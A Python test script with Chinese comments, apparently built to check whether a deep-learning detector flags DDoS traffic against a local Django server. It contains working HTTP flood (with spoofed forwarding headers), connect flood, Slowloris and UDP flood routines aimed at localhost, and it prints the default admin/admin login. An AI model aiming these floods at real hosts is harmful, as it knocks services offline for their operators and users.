#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS攻击测试脚本
专门用于测试深度学习系统对DDoS攻击的识别能力
"""

import socket
import time
import random
import threading
import urllib.request
import urllib.parse
import urllib.error
from concurrent.futures import ThreadPoolExecutor
import sys

class DDoSAttackSimulator:
    def __init__(self, target_ip="127.0.0.1", target_port=8000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_active = False
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        
    def test_connection(self):
        """测试目标连接"""
        print(f"测试连接到 {self.target_ip}:{self.target_port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result == 0:
                print("✓ 目标服务器连接正常")
                return True
            else:
                print("✗ 无法连接到目标服务器")
                return False
        except Exception as e:
            print(f"✗ 连接测试失败: {e}")
            return False
    
    def syn_flood_attack(self, duration=30, threads=10):
        """SYN洪水攻击模拟"""
        print(f"开始SYN洪水攻击 - 持续{duration}秒，{threads}个线程")
        
        self.attack_active = True
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        
        start_time = time.time()
        
        def syn_flood_worker():
            while self.attack_active and (time.time() - start_time) < duration:
                try:
                    # 创建TCP连接但不完成握手
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    
                    # 尝试连接但立即关闭，模拟SYN洪水
                    result = sock.connect_ex((self.target_ip, self.target_port))
                    sock.close()
                    
                    self.request_count += 1
                    if result == 0:
                        self.success_count += 1
                    
                    # 高频率攻击
                    time.sleep(0.01)
                    
                except Exception as e:
                    self.error_count += 1
                    time.sleep(0.1)
        
        # 启动多个攻击线程
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=syn_flood_worker)
            t.start()
            threads_list.append(t)
        
        # 监控攻击进度
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            print(f"SYN洪水攻击进行中... {elapsed:.1f}s - 请求数: {self.request_count}, 成功: {self.success_count}, 错误: {self.error_count}")
            time.sleep(5)
        
        self.attack_active = False
        
        # 等待所有线程结束
        for t in threads_list:
            t.join()
        
        print(f"SYN洪水攻击完成 - 总请求: {self.request_count}, 成功: {self.success_count}, 错误: {self.error_count}")
    
    def http_flood_attack(self, duration=30, threads=15):
        """HTTP洪水攻击"""
        print(f"开始HTTP洪水攻击 - 持续{duration}秒，{threads}个线程")
        
        self.attack_active = True
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        
        start_time = time.time()
        
        # 攻击载荷
        attack_paths = [
            "/",
            "/admin/",
            "/admin/login/",
            "/admin/main/trafficlog/",
            "/static/admin/css/base.css",
            "/static/admin/js/core.js",
        ]
        
        def http_flood_worker():
            while self.attack_active and (time.time() - start_time) < duration:
                try:
                    # 随机选择攻击路径
                    path = random.choice(attack_paths)
                    url = f"http://{self.target_ip}:{self.target_port}{path}"
                    
                    # 构造恶意请求头
                    req = urllib.request.Request(url)
                    req.add_header('User-Agent', 'DDoSBot/1.0 (Flood Attack)')
                    req.add_header('X-Attack-Type', 'HTTP-Flood')
                    req.add_header('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
                    
                    # 发送请求
                    with urllib.request.urlopen(req, timeout=2) as response:
                        self.success_count += 1
                    
                    self.request_count += 1
                    
                    # 高频率攻击，几乎无延迟
                    time.sleep(0.005)
                    
                except urllib.error.HTTPError as e:
                    self.request_count += 1
                    if e.code < 500:  # 4xx错误也算成功到达服务器
                        self.success_count += 1
                    else:
                        self.error_count += 1
                except Exception as e:
                    self.error_count += 1
                    time.sleep(0.1)
        
        # 启动多个攻击线程
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=http_flood_worker)
            t.start()
            threads_list.append(t)
        
        # 监控攻击进度
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            rate = self.request_count / elapsed if elapsed > 0 else 0
            print(f"HTTP洪水攻击进行中... {elapsed:.1f}s - 请求数: {self.request_count} (速率: {rate:.1f}/s), 成功: {self.success_count}, 错误: {self.error_count}")
            time.sleep(3)
        
        self.attack_active = False
        
        # 等待所有线程结束
        for t in threads_list:
            t.join()
        
        total_rate = self.request_count / duration
        print(f"HTTP洪水攻击完成 - 总请求: {self.request_count}, 平均速率: {total_rate:.1f}/s, 成功: {self.success_count}, 错误: {self.error_count}")
    
    def slowloris_attack(self, duration=20, connections=50):
        """Slowloris慢速攻击"""
        print(f"开始Slowloris慢速攻击 - 持续{duration}秒，{connections}个连接")
        
        self.attack_active = True
        connections_list = []
        
        start_time = time.time()
        
        def create_slow_connection():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.target_ip, self.target_port))
                
                # 发送不完整的HTTP请求
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(b"Host: " + self.target_ip.encode() + b"\r\n")
                sock.send(b"User-Agent: SlowlorisBot/1.0\r\n")
                
                return sock
            except:
                return None
        
        # 创建初始连接
        for i in range(connections):
            sock = create_slow_connection()
            if sock:
                connections_list.append(sock)
                print(f"创建慢速连接 {i+1}/{connections}")
                time.sleep(0.1)
        
        print(f"成功创建 {len(connections_list)} 个慢速连接")
        
        # 保持连接活跃
        while (time.time() - start_time) < duration:
            active_connections = 0
            for sock in connections_list[:]:
                try:
                    # 发送额外的头部来保持连接
                    sock.send(b"X-Keep-Alive: " + str(random.randint(1000, 9999)).encode() + b"\r\n")
                    active_connections += 1
                except:
                    connections_list.remove(sock)
            
            elapsed = time.time() - start_time
            print(f"Slowloris攻击进行中... {elapsed:.1f}s - 活跃连接: {active_connections}")
            time.sleep(5)
        
        # 关闭所有连接
        for sock in connections_list:
            try:
                sock.close()
            except:
                pass
        
        print(f"Slowloris攻击完成")
    
    def udp_flood_attack(self, duration=15, threads=8):
        """UDP洪水攻击"""
        print(f"开始UDP洪水攻击 - 持续{duration}秒，{threads}个线程")
        
        self.attack_active = True
        self.request_count = 0
        
        start_time = time.time()
        
        def udp_flood_worker():
            while self.attack_active and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # 发送随机UDP数据包
                    data = b"A" * random.randint(64, 1024)
                    sock.sendto(data, (self.target_ip, self.target_port))
                    sock.close()
                    
                    self.request_count += 1
                    time.sleep(0.01)
                    
                except Exception as e:
                    time.sleep(0.1)
        
        # 启动多个攻击线程
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=udp_flood_worker)
            t.start()
            threads_list.append(t)
        
        # 监控攻击进度
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            rate = self.request_count / elapsed if elapsed > 0 else 0
            print(f"UDP洪水攻击进行中... {elapsed:.1f}s - 数据包数: {self.request_count} (速率: {rate:.1f}/s)")
            time.sleep(3)
        
        self.attack_active = False
        
        # 等待所有线程结束
        for t in threads_list:
            t.join()
        
        print(f"UDP洪水攻击完成 - 总数据包: {self.request_count}")

def generate_normal_traffic(target_ip="127.0.0.1", target_port=8000, duration=60):
    """生成正常流量作为对比"""
    print(f"生成正常流量 - 持续{duration}秒")
    
    start_time = time.time()
    request_count = 0
    
    normal_urls = [
        f"http://{target_ip}:{target_port}/",
        f"http://{target_ip}:{target_port}/admin/",
        f"http://{target_ip}:{target_port}/admin/main/trafficlog/",
    ]
    
    while (time.time() - start_time) < duration:
        try:
            url = random.choice(normal_urls)
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            with urllib.request.urlopen(req, timeout=5) as response:
                request_count += 1
                print(f"正常请求 #{request_count}: {response.getcode()}")
            
            # 正常间隔
            time.sleep(random.uniform(5, 15))
            
        except Exception as e:
            print(f"正常流量错误: {e}")
            time.sleep(5)
    
    print(f"正常流量生成完成 - 总请求: {request_count}")

def main():
    print("=" * 70)
    print("DDoS攻击测试工具")
    print("专门测试深度学习系统对DDoS攻击的识别能力")
    print("=" * 70)
    
    target_ip = "127.0.0.1"
    target_port = 8000
    
    simulator = DDoSAttackSimulator(target_ip, target_port)
    
    # 测试连接
    if not simulator.test_connection():
        print("无法连接到目标服务器，请确保Django服务器正在运行")
        return
    
    print(f"\n目标: {target_ip}:{target_port}")
    print("开始DDoS攻击序列...\n")
    
    # 启动正常流量生成（后台）
    normal_thread = threading.Thread(
        target=generate_normal_traffic, 
        args=(target_ip, target_port, 120)
    )
    normal_thread.daemon = True
    normal_thread.start()
    
    try:
        # 1. HTTP洪水攻击
        print("=" * 50)
        print("测试1: HTTP洪水攻击")
        print("=" * 50)
        simulator.http_flood_attack(duration=25, threads=12)
        
        print("\n等待5秒...")
        time.sleep(5)
        
        # 2. SYN洪水攻击
        print("=" * 50)
        print("测试2: SYN洪水攻击")
        print("=" * 50)
        simulator.syn_flood_attack(duration=20, threads=8)
        
        print("\n等待5秒...")
        time.sleep(5)
        
        # 3. Slowloris攻击
        print("=" * 50)
        print("测试3: Slowloris慢速攻击")
        print("=" * 50)
        simulator.slowloris_attack(duration=15, connections=30)
        
        print("\n等待5秒...")
        time.sleep(5)
        
        # 4. UDP洪水攻击
        print("=" * 50)
        print("测试4: UDP洪水攻击")
        print("=" * 50)
        simulator.udp_flood_attack(duration=12, threads=6)
        
    except KeyboardInterrupt:
        print("\n用户中断攻击测试")
        simulator.attack_active = False
    
    print("\n" + "=" * 70)
    print("DDoS攻击测试完成！")
    print("=" * 70)
    print("检查检测结果:")
    print(f"1. 访问: http://{target_ip}:{target_port}/admin/main/trafficlog/")
    print("2. 用户名: admin, 密码: admin")
    print("3. 查看攻击类型为 'DosFam' 的记录")
    print("4. 检查威胁级别是否为 '高危'")
    print("=" * 70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n程序被用户中断")
    except Exception as e:
        print(f"程序出错: {e}")
